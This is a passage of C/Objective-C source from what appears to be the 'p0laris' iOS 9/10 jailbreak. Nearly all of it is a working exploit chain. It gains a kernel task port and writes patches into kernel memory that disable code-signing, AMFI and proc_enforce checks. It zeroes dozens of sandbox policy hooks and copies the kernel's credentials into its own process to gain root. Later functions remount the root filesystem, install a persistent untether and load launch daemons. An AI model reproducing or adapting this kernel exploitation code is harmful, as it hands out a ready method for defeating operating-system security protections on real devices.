	run_cmd("mv /System/Library/LaunchDaemons/com.apple.timed.plist /System/Library/LaunchDaemons/com.apple.timed.plist_");
	
	/*
	 *  0wn codesigning
	 */
	_0wn();
	
	/*
	 *  taunting...
	 */
	lprintf("[*] game over, codesigning. would you like to try again?");
#endif
	
	lprintf("[*] untether should be haxd on now");
	
	/*
	 *  sync, if we're already jailbroken
	 *  and the untether is now triggering,
	 *  we might panic to all hell and back
	 */
	sync();
	sync();
	sync();
	sync();
	sync();
	
	/* todo */
	
	return ret;
}
#else
#error This isn't enabled anymore, censored for public release: the mount bug was chosen. Nice job being curious, though! :)
#endif
#endif

bool extract_bootstrap(void) {
	bool re_extracting = false;
	bool ret = true;
	
	if (exists("/.p0laris") || exists("/.installed_home_depot")) {
		re_extracting = true;
		lprintf("k? guess we're re-extracting then. your choice, i guess? ...");
	}
	
	progress_ui("getting bundle paths");
	char* tar_path = bundle_path("tar");
	char* launchctl_path = bundle_path("launchctl");
	char* cydia_path = bundle_path("Cydia-9.0r4-Raw.tar");
	
	chmod(tar_path, 0777);
	
	/*
	 *  extract bootstrap
	 */
	progress_ui("extracting, this might take a while");
	chmod(tar_path, 0777);
	char* argv_[] = {tar_path, "-xf", cydia_path, "-C", "/", "--preserve-permissions", NULL};
	easy_spawn(tar_path, argv_);
	
	/*
	 *  touch cydia_no_stash (disable stashing, not included yet)
	 */
	progress_ui("disabling stashing");
	run_cmd("/bin/touch /.cydia_no_stash");
	
	/*
	 *  copy tar
	 */
	progress_ui("copying tar");
	run_cmd("/bin/cp -p %s /bin/tar", tar_path);
	
	/*
	 *  copy launchctl
	 */
	progress_ui("copying launchctl");
	run_cmd("/bin/cp -p %s /bin/launchctl", launchctl_path);
	
	/*
	 *  make them exectuable
	 */
	chmod("/bin/tar", 0755);
	chmod("/bin/launchctl", 0755);
	
	/*
	 *  i don't remember where this is from, Home Depot / Phoenix?
	 */
	chmod("/private", 0755);
	chmod("/private/var", 0755);
	chmod("/private/var/mobile", 0711);
	chmod("/private/var/mobile/Library", 0711);
	chmod("/private/var/mobile/Library/Preferences", 0755);
	
	mkdir("/Library/LaunchDaemons", 0777);
	
#if INSTALL_UNTETHER
	progress_ui("installing untether");
	install_untether();
	progress_ui("installed untether");
#endif
	
	if (!exists("/.p0laris")) {
		FILE* fp = fopen("/.p0laris", "w");
		fprintf(fp, "please don't delete this, the sky will fall and stuff or something\n"
				"  - p0laris, with love from spv.\n");
		fclose(fp);
	}
	
	sync();
	sync();
	sync();
	sync();
	sync();
	
	return ret;
}

#if DO_CSBYPASS
/*
 *  codesigning exploit is unfinished
 */
bool csbypass_wrapper(void) {
	bool ret = true;
	
	bool _0wnd = _0wn();
	lprintf("codesigning 0wnd: %s", _0wnd ? "true" : "false");
	
	sync();
	sync();
	sync();
	sync();
	sync();
	
#if 0
	uint32_t* comm_page_time = (uint32_t*)0xffff4048;
	while (*comm_page_time < 1000000000) {
		usleep(100000);
	}
	//	sleep(2);
#endif
	
	return ret;
}
#endif

bool post_jailbreak(void) {
	bool need_uicache = false;
	bool ret = true;
	
	if (global_untethered) {
		run_cmd("/usr/sbin/BTServer_");
#if DO_CSBYPASS
		csbypass_wrapper();
#endif
	}
	
	progress_ui("remounting /");
	char* nmr = strdup("/dev/disk0s1s1");
	int mntr = mount("hfs", "/", 0x10000, &nmr);
	lprintf("mount(...); = %d\n", mntr);
	
#if !FIRST_TIME_OVERRIDE
	if (!exists("/.p0laris") && !exists("/.installed_home_depot")) {
#endif
		progress_ui("extracting bootstrap");
		extract_bootstrap();
		need_uicache = true;
#if !FIRST_TIME_OVERRIDE
	}
#endif
	
#if INSTALL_UNTETHER
	if (!exists("/untether/p0laris")) {
		if (exists("/untether")) {
			progress_ui("fixing untether");
		} else {
			progress_ui("installing untether");
		}
		install_untether();
	}
#endif
	
	/*
	 *  doubleH3lix
	 */
	progress_ui("fixing springboard");
	NSMutableDictionary *md = [[NSMutableDictionary alloc] initWithContentsOfFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist"];
	
	[md setObject:[NSNumber numberWithBool:YES] forKey:@"SBShowNonDefaultSystemApps"];
	
	[md writeToFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist" atomically:YES];
	
	progress_ui("restarting cfprefsd");
	run_cmd("/usr/bin/killall -9 cfprefsd &");
	
#if !FIRST_TIME_OVERRIDE
	if (need_uicache) {
#endif
		progress_ui("running uicache");
		run_cmd("su -c uicache mobile &");
#if !FIRST_TIME_OVERRIDE
	}
#endif
	
	progress_ui("loading launch daemons");
	run_cmd("/bin/launchctl load /Library/LaunchDaemons/*");
	run_cmd("/etc/rc.d/*");
	
	progress_ui("respringing");
	run_cmd("(killall -9 backboardd) &");
	
	if (!global_untethered) {
#if DO_CSBYPASS
		csbypass_wrapper();
#endif
	}
	
	return ret;
}

bool extract_bootstrap10(void) {
	bool re_extracting = false;
	bool ret = true;
	
	if (exists("/.p0laris") || exists("/.installed_home_depot")) {
		re_extracting = true;
		lprintf("k? guess we're re-extracting then. your choice, i guess? ...");
	}
	
	progress_ui("getting bundle paths");
	char* tar_path = bundle_path("tar");
	char* launchctl_path = bundle_path("launchctl");
	char* cydia_path = bundle_path("Cydia-10.tar");
	
	chmod(tar_path, 0777);
	
	/*
	 *  extract bootstrap
	 */
	progress_ui("extracting, this might take a while");
	chmod(tar_path, 0777);
	char* argv_[] = {tar_path, "-xf", cydia_path, "-C", "/", "--preserve-permissions", "--overwrite", NULL};
	easy_spawn(tar_path, argv_);
	
	/*
	 *  touch cydia_no_stash (disable stashing, not included yet)
	 */
	progress_ui("disabling stashing");
	run_cmd("/bin/touch /.cydia_no_stash");
	
	/*
	 *  copy tar
	 */
	progress_ui("copying tar");
	run_cmd("/bin/cp -p %s /bin/tar", tar_path);
	
	/*
	 *  copy launchctl
	 */
	progress_ui("copying launchctl");
	run_cmd("/bin/cp -p %s /bin/launchctl", launchctl_path);
	
	/*
	 *  make them exectuable
	 */
	chmod("/bin/tar", 0755);
	chmod("/bin/launchctl", 0755);
	
	/*
	 *  i don't remember where this is from, Home Depot / Phoenix?
	 */
	chmod("/private", 0755);
	chmod("/private/var", 0755);
	chmod("/private/var/mobile", 0711);
	chmod("/private/var/mobile/Library", 0711);
	chmod("/private/var/mobile/Library/Preferences", 0755);
	
	mkdir("/Library/LaunchDaemons", 0777);
	
#if INSTALL_UNTETHER
	progress_ui("installing untether");
	install_untether();
	progress_ui("installed untether");
#endif
	
	if (!exists("/.p0laris")) {
		FILE* fp = fopen("/.p0laris", "w");
		fprintf(fp, "please don't delete this, the sky will fall and stuff or something\n"
				"  - p0laris, with love from spv.\n");
		fclose(fp);
	}
	
	sync();
	sync();
	sync();
	sync();
	sync();
	
	return ret;
}

bool post_jailbreak10(void) {
	bool need_uicache = false;
	bool ret = true;
	
	if (global_untethered) {
		run_cmd("/usr/sbin/BTServer_");
#if DO_CSBYPASS
		csbypass_wrapper();
#endif
	}
	
	progress_ui("remounting /");
	char* nmr = strdup("/dev/disk0s1s1");
	int mntr = mount("hfs", "/", 0x10000, &nmr);
	lprintf("mount(...); = %d\n", mntr);
	
#if !FIRST_TIME_OVERRIDE
	if (!exists("/.p0laris") && !exists("/.installed_home_depot")) {
#endif
		progress_ui("extracting bootstrap");
		extract_bootstrap10();
		need_uicache = true;
#if !FIRST_TIME_OVERRIDE
	}
#endif
	
#if INSTALL_UNTETHER
	if (!exists("/untether/p0laris")) {
		if (exists("/untether")) {
			progress_ui("fixing untether");
		} else {
			progress_ui("installing untether");
		}
		install_untether();
	}
#endif
	
	/*
	 *  doubleH3lix
	 */
	progress_ui("fixing springboard");
	NSMutableDictionary *md = [[NSMutableDictionary alloc] initWithContentsOfFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist"];
	
	[md setObject:[NSNumber numberWithBool:YES] forKey:@"SBShowNonDefaultSystemApps"];
	
	[md writeToFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist" atomically:YES];
	
	progress_ui("restarting cfprefsd");
	run_cmd("/usr/bin/killall -9 cfprefsd &");
	
#if !FIRST_TIME_OVERRIDE
	if (need_uicache) {
#endif
		progress_ui("running uicache");
		run_cmd("su -c uicache mobile &");
#if !FIRST_TIME_OVERRIDE
	}
#endif
	
	progress_ui("loading launch daemons");
	run_cmd("/bin/launchctl load /Library/LaunchDaemons/*");
	run_cmd("/etc/rc.d/*");
	
	progress_ui("respringing");
	run_cmd("(killall -9 backboardd) &");
	
	if (!global_untethered) {
#if DO_CSBYPASS
		csbypass_wrapper();
#endif
	}
	
	return ret;
}

bool patch_kernel10(uint8_t* buf, uint32_t len) {
	struct offsets_t* offsets = malloc(sizeof(struct offsets_t));
	
	char* version_string = (char*)[[[UIDevice currentDevice] systemVersion]
										  UTF8String];
	
#if 0
	offsets->mount_common = find_mount_common10(0x80001000, buf, len, version_string);
	offsets->mapForIO = find_mapForIO10(0x80001000, buf, len, version_string);
	offsets->PE_i_can_has_debugger_offset = find_PE_i_can_has_debugger_offset10(0x80001000, buf, len, version_string);
	uint32_t nosuid_enforcement = find_nosuid_enforcement10(0x80001000, buf, len, version_string);
	uint32_t tfp = find_tfp10(0x80001000, buf, len, version_string);
	uint32_t fuck = find_fuck(0x80001000, buf, len, version_string);
	uint32_t bxlr_gadget = find_bxlr_gadget(0x80001000, buf, len, version_string);
	uint32_t amfi_memcmp = find_amfi_memcmp(0x80001000, buf, len, version_string);
	offsets->sbops = find_sbops10(0x80001000, buf, len, version_string);
	
	lprintf("mount_common = 0x%08x", offsets->mount_common);
	lprintf("mapForIO = 0x%08x", offsets->mapForIO);
	lprintf("PE_i_can_has_debugger_offset = 0x%08x", offsets->PE_i_can_has_debugger_offset);
	lprintf("nosuid_enforcement = 0x%08x", nosuid_enforcement);
	lprintf("tfp = 0x%08x", tfp);
	lprintf("fuck = 0x%08x", fuck);
	lprintf("amfi_memcmp = 0x%08x", amfi_memcmp);
	lprintf("bxlr_gadget = 0x%08x", bxlr_gadget);
	lprintf("sbops = 0x%08x", offsets->sbops);
	
	kwrite_uint8(kernel_base + offsets->mount_common, 0xe0);
	kwrite_uint32(kernel_base + offsets->mapForIO, 0xbf00bf00);
	kwrite_uint32(kernel_base + offsets->PE_i_can_has_debugger_offset, 0x20012001);
	kwrite_uint8(kernel_base + nosuid_enforcement, 0x0);
	kwrite_uint8(kernel_base + tfp + 0x0, 0x0);
	kwrite_uint8(kernel_base + tfp + 0x1, 0xbf);
	kwrite_uint32(kernel_base + fuck, kernel_base + offsets->mapForIO);
	kwrite_uint32(kernel_base + amfi_memcmp, kernel_base + bxlr_gadget);
#endif
	
	/*
	 *  cc @dora2iOS
	 */
	uint32_t proc_enforce = find_10_proc_enforce(0x80001000, buf, len);
	uint32_t ret1_gadget = find_10_mov_r0_1_bx_lr(0x80001000, buf, len);
	uint32_t pid_check = find_10_pid_check(0x80001000, buf, len);
	uint32_t locked_task = find_10_convert_port_to_locked_task(0x80001000, buf, len);
	uint32_t i_can_has_debugger_1 = find_10_i_can_has_debugger_1_103(0x80001000, buf, len);
	uint32_t i_can_has_debugger_2 = find_10_i_can_has_debugger_2_103(0x80001000, buf, len);
	uint32_t mount_patch = find_10_mount_103(0x80001000, buf, len);
	uint32_t vm_map_enter = find_10_vm_map_enter_103(0x80001000, buf, len);
	uint32_t vm_map_protect = find_10_vm_map_protect_103(0x80001000, buf, len);
	uint32_t vm_fault_enter = find_10_vm_fault_enter_103(0x80001000, buf, len);
	uint32_t csops_patch = find_10_csops_103(0x80001000, buf, len);
	uint32_t amfi_ret = find_10_amfi_execve_ret(0x80001000, buf, len);
	uint32_t amfi_cred_label_update_execve = find_10_amfi_cred_label_update_execve(0x80001000, buf, len);
	uint32_t amfi_vnode_check_signature = find_10_amfi_vnode_check_signature(0x80001000, buf, len);
	uint32_t amfi_loadEntitlementsFromVnode = find_10_amfi_loadEntitlementsFromVnode(0x80001000, buf, len);
	uint32_t amfi_vnode_check_exec = find_10_amfi_vnode_check_exec(0x80001000, buf, len);
	uint32_t mapForIO = find_10_mapForIO_103(0x80001000, buf, len);
	uint32_t sbcall_debugger = find_10_sandbox_call_i_can_has_debugger_103(0x80001000, buf, len);
	uint32_t vfsContextCurrent = find_10_vfs_context_current(0x80001000, buf, len);
	uint32_t vnodeGetattr = find_10_vnode_getattr(0x80001000, buf, len);
	uint32_t _allproc = find_10_allproc(0x80001000, buf, len);
	uint32_t kernel_pmap = find_10_kernel_pmap(0x80001000, buf, len);
	uint32_t kernelConfig_stub = find_10_lwvm_i_can_has_krnl_conf_stub(0x80001000, buf, len);
	offsets->sbops = find_10_sbops(0x80001000, buf, len);
	uint32_t bxlr_gadget = find_bxlr_gadget(0x80001000, buf, len, version_string);
	uint32_t amfi_memcmp = find_amfi_memcmp(0x80001000, buf, len, version_string);
	
	kwrite_uint32(kernel_base + proc_enforce, 0x0);
	kwrite_uint32(kernel_base + i_can_has_debugger_1, 0x1);
	kwrite_uint32(kernel_base + i_can_has_debugger_2, 0x1);
	kwrite_uint32(kernel_base + vm_fault_enter, 0x0b01f04f);
	kwrite_uint32(kernel_base + vm_map_enter, 0xbf00bf00);
	kwrite_uint32(kernel_base + vm_map_protect, 0xbf00bf00);
	kwrite_uint32(kernel_base + csops_patch, 0xbf00bf00);
	kwrite_uint8(kernel_base + csops_patch + 0x4, 0x00);
	kwrite_uint8(kernel_base + csops_patch + 0x5, 0xbf);
	kwrite_uint8(kernel_base + mount_patch + 0x7, 0xe0);
	kwrite_uint32(kernel_base + mapForIO, 0xbf002000);
	kwrite_uint32(kernel_base + mapForIO + 0x4, 0xbf00bf00);
	kwrite_uint32(kernel_base + sbcall_debugger, 0xbf00bf00);
	kwrite_uint32(kernel_base + amfi_memcmp, kernel_base + bxlr_gadget);
	kwrite_uint8(kernel_base + pid_check, 0x00);
	kwrite_uint8(kernel_base + pid_check + 0x1, 0xbf);
//	kwrite_uint8(kernel_base + locked_task, 0x00);
	kwrite_uint8(kernel_base + locked_task + 0x1, 0xe0);
	kwrite_uint32(kernel_base + kernelConfig_stub, kernel_base + ret1_gadget);
	
	/*
	 *  fuck the sandbox
	 */
	lprintf("nuking sandbox @ 0x%08x", kernel_base + offsets->sbops);
	
	uint32_t sbops = kernel_base + offsets->sbops;
	
	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_mount), 0);
	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_remount), 0);
	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_umount), 0);
	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_write), 0);
	
	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_file_check_mmap), 0);
	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_rename), 0);
	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_access), 0);
	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_chroot), 0);
	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_create), 0);
	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_deleteextattr), 0);
	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_exchangedata), 0);
	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_exec), 0);
	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getattrlist), 0);
	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getextattr), 0);
	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_ioctl), 0);
	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_link), 0);
	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_listextattr), 0);
	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_open), 0);
	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_readlink), 0);
	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setattrlist), 0);
	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setextattr), 0);
	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setflags), 0);
	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setmode), 0);
	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setowner), 0);
	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes), 0);
	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_stat), 0);
	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_truncate), 0);
	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_unlink), 0);
	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_notify_create), 0);
	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_fsgetpath), 0);
	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getattr), 0);
	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_stat), 0);
	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_setauid), 0);
	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_getauid), 0);

	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_fork), 0);
	
	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_get_cs_info), 0);
	kwrite_uint32(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_set_cs_info), 0);
	
	/*
	 *  this code traverses a linked list in kernel memory to find the processes.
	 *  cleaned up
	 *
	 *  struct proc {
	 * 	 LIST_ENTRY(proc) p_list;	// List of all processes.		//
	 *
	 * 	 pid_t	   p_pid;		  // Process identifier. (static)	//
	 * 	 void *	  task;		   // corresponding task (static)		//
	 * 	 ...
	 *  };
	 *
	 *  #define LIST_ENTRY(type)											\
	 *  struct {															\
	 * 	 struct type *le_next;		// next element						//  \
	 * 	 struct type **le_prev;		// address of previous next element //  \
	 *  }
	 *
	 *  sizeof(uintptr_t) on 32-bit = 4
	 *  2 pointers = 2 * 4 = 8
	 *  offset of p_pid = 8
	 *  the next proc entry is the first pointer in the LIST_ENTRY struct, which is conveniently
	 *  the first element in the proc struct.
	 *  therefore, offset of the next proc entry is 0
	 *
	 *  loop through the linked list by getting allproc
	 *  check the pid, and compare it to ours or the kernels
	 *  save it if it's either, otherwise continue
	 *
	 *  eventually at the end we have the addresses of the kernel's proc struct and ours.
	 *  now we do writing magic to get kernel privs :P
	 */
	
	/*
	 *  get kernel credentials so we can get our friend, uid=0.
	 */
	lprintf("stealing kernel creds");
	uint32_t allproc_read	= kread_uint32(kernel_base + _allproc);
	lprintf("uint32_t allproc = 0x%08x, uint32_t allproc_read = 0x%08x;",
			kernel_base + _allproc,
			allproc_read);
	pid_t our_pid		= getpid();
	lprintf("our_pid = %d", our_pid);
	
	myproc				= 0;
	uint32_t kernproc	= 0;
	
	if (allproc_read != 0) {
		while (myproc == 0 || kernproc == 0) {
			uint32_t kpid = kread_uint32(allproc_read + 8);
			if (kpid == our_pid) {
				myproc = allproc_read;
				lprintf("found myproc 0x%08x, %d", myproc, kpid);
			} else if (kpid == 0) {
				kernproc = allproc_read;
				lprintf("found kernproc 0x%08x, %d", kernproc, kpid);
			}
			allproc_read = kread_uint32(allproc_read);
		}
	} else {
		/* fail */
		return false;
	}
	
	/*
	 *  TODO: don't hardcode 0xa4, ideally write patchfinder code for it
	 */
	
	uint32_t kern_ucred = kread_uint32(kernproc + 0x98);
	lprintf("uint32_t kern_ucred = 0x%08x;", kern_ucred);
	
	ourcred = kread_uint32(myproc + 0x98);
	lprintf("uint32_t ourcred = 0x%08x;", ourcred);

	/*
	 *  i am (g)root
	 */
	kwrite_uint32(myproc + 0x98, kern_ucred);
	setuid(0);
	
	
	
	return true;
}

char* my_strcat(char* s1, char* s2) {
	char* s3 = NULL;
	asprintf(&s3, "%s%s", s1, s2);
	return s3;
}

bool jailbreak10(void) {
	uint32_t before, after, pdstused, psrcused;
	uint8_t *buf, *start_buf, *whatever;
	char *darwin_kernel, *doc_dir;
	NSString *documentsDirectory;
	NSArray *paths;
	size_t sz;
	
//	tfp0 = v0rtex_me_harder();
	tfp0 = sock_port_me_harder();
	lprintf("tfp0=0x%x", tfp0);
	
	progress_ui("patching pmap");
	patch_kernel_pmap();
	progress("patched pmap");
	
	progress_ui("checking pmap patch");
	
	before = kread_uint32(kernel_base);
	kwrite_uint32(kernel_base, 0x41424344);
	after = kread_uint32(kernel_base);
	kwrite_uint32(kernel_base, before);
	
#if ENABLE_DEBUG
	progress("kbase before: 0x%x, kbase after: 0x%x",
			 before,
			 after);
#endif
	
	/*
	 *  i commented out "before == 0xfeedface" as at times,
	 *  i will test kernel patches and/or other functionality
	 *  on an already jailbroken device, and don't feel like rebooting.
	 *  also so that you can re-install the untether without rebooting
	 *  after installing the application :P
	 */
	
	if (before != after && /* before == 0xfeedface && */ after == 0x41424344) {
		progress_ui("pmap patched!");
	} else {
		progress_ui("pmap patch failed");
		goto done;
	}
	
	FILE* fp = fopen("/System/Library/Caches/com.apple.kernelcaches/kernelcache", "rb");
	
	fseek(fp, 0, SEEK_END);
	sz = ftell(fp);
	rewind(fp);
	
	buf = (uint8_t*)malloc(sz);
	whatever = (uint8_t*)malloc(sz * 2);
	
	fread(buf, 1, DUMP_LENGTH, fp);
	
	start_buf = (uint8_t*)memmem(buf, sz, "\xff\xce\xfa\xed\xfe", 5);
	
	printf("%x\n", *(uint32_t*)start_buf);
	
	lzss_me_harder(whatever, sz * 2, &pdstused, start_buf, sz, &psrcused);
	
	paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
	documentsDirectory = [paths firstObject];
	doc_dir = (char*)[documentsDirectory UTF8String];
	
	/*
	FILE* fp2 = fopen(my_strcat(doc_dir, "/lzssed.bin"), "wb");
	fwrite(whatever, 1, sz * 2, fp2);
	fclose(fp2);
	 */
	
	darwin_kernel = (char*)memmem(whatever, sz * 2, "Darwin", strlen("Darwin"));
	
	printf("%s\n", darwin_kernel);
	printf("%x\n", *(uint32_t*)whatever);
	
	patch_kernel10(whatever, sz * 2);
	
	free(buf);
	fclose(fp);
	
	progress_ui("doing post jailbreak work");
	post_jailbreak10();
	
done:
	return true;
}

bool jailbreak(void) {
#if DUMP_KERNEL
	NSString *ns_doc_dir = NULL;
#endif
	
	uint32_t before = -1;
	uint32_t after = -1;
	
#if DUMP_KERNEL
	NSArray *paths = NULL;
#endif
	
#if DUMP_KERNEL
	char* open_this = NULL;
	char* doc_dir = NULL;
	char* dump = NULL;
#endif
	
	bool ret = false;
	
	progress_ui("exploiting kernel");
	
	if (i_system_version_field(0) >= 10) {
		return jailbreak10();
	}
	
	tfp0 = get_kernel_task();
	
	lprintf("I live in a constant state of fear and misery");
	lprintf("Do you miss me anymore?");
	lprintf("And I don't even notice when it hurts anymore");
	lprintf("Anymore, anymore, anymore");
	
	progress_ui("exploited kernel");
	
	kernel_base = kbase();
	kaslr_slide = kernel_base - UNSLID_BASE;
	
#if DUMP_KERNEL
	dump = malloc(DUMP_LENGTH);
	
	dump_kernel(dump, DUMP_LENGTH);
	
	paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
												NSUserDomainMask,
												YES);
	ns_doc_dir = [paths firstObject];
	doc_dir = (char*)[ns_doc_dir UTF8String];
	asprintf(&open_this,
			 "%s/kernel_dump-%ld-0x%08x.bin",
			 doc_dir,
			 time(NULL),
			 kaslr_slide);
	
	FILE *f = fopen(open_this, "w");
	fwrite(dump,
		   1,
		   (32 * 1024 * 1024),
		   f);
	fclose(f);
	
	zfree(&dump);
	
	goto done;
#endif
	
#if ENABLE_DEBUG
	progress("got tfp0! tfp0=0x%x, kernel_base=0x%08x, kaslr_slide=0x%08x",
			 tfp0,
			 kernel_base,
			 kaslr_slide);
#endif
	
	progress_ui("patching pmap");
	patch_kernel_pmap();
	progress("patched pmap");
	
	progress_ui("checking pmap patch");
	
	before	= kread_uint32(kernel_base);
	kwrite_uint32(kernel_base, 0x41424344);
	after	= kread_uint32(kernel_base);
	kwrite_uint32(kernel_base, before);
	
#if ENABLE_DEBUG
	progress("kbase before: 0x%x, kbase after: 0x%x",
			 before,
			 after);
#endif
	
	/*
	 *  i commented out "before == 0xfeedface" as at times,
	 *  i will test kernel patches and/or other functionality
	 *  on an already jailbroken device, and don't feel like rebooting.
	 *  also so that you can re-install the untether without rebooting
	 *  after installing the application :P
	 */
	
	if (before != after && /* before == 0xfeedface && */ after == 0x41424344) {
		progress_ui("pmap patched!");
	} else {
		progress_ui("pmap patch failed");
		goto done;
	}
	
	progress_ui("cleaning up the kernel");
	exploit_cleanup(tfp0);
	
	progress_ui("patching kernel");
	if (!patch_kernel())
		goto done;
	progress_ui("patched kernel");
	
	progress_ui("doing post jailbreak work");
	post_jailbreak();
	
	/*
	 *  note: todo: save original uid in case unsandboxed root daemon
	 */
	
	kwrite_uint32(myproc + 0xa4, ourcred);
	setuid(501);
	
#if BTSERVER_USED
	if (global_untethered)
		run_cmd("launchctl bsexec .. /bin/sh -c \"(while true; do /usr/sbin/BTServer_; done) &\"");
#endif
	
#if UNPATCH_PMAP
	progress("unpatching pmap");
	pmap_unpatch();
	progress("unpatched pmap");
#endif
	
	ret = true;
	
	zfree(&offsets);
	
	syslog(LOG_SYSLOG, "we out here");
	
done:
	progress_ui("cleaning up");
	exploit_cleanup(tfp0);
	
	return ret;
}

bool _jailbreak(void) {
	return jailbreak();
}

